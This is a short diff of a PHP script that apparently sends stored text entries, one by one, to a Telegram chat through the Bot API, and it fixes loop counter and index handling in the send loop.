@@ -65,20 +65,16 @@ else{
         
       	        $datos[$controllo][$controllo][$controllo] = "$info1"." ". "$info2"." "."$info3";
         
-       	       $controllo = $controllo + 1;   
-	   
-	       
+			$controllo = $controllo + 1;
 		//$url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text=" . urlencode("$mensaje");
 		}
-	  
-   		 for($xx = 0; $xx <= $controllo; $xx = $xx + 1){
-			 
-			   $indice = 0;
-			   
-			   http_request("https://api.telegram.org/bot{$token}/sendMessage?chat_id=".$chat_id."&text=".$indice."-".$datos[$xx][$xx][$xx]);
-			   $indice = $xx + 1;
-			   $text = " ";
-			}	  
+	  	$controllo = $controllo - 1;
+		$indice = 0;
+   		for($xx = 0; $xx <= $controllo; $xx = $xx + 1){
+			http_request("https://api.telegram.org/bot{$token}/sendMessage?chat_id=".$chat_id."&text=".$indice."-".$datos[$xx][$xx][$xx]);
+			$indice = $xx + 1;
+			$text = " ";
+		}	  
 	  
 	  
 
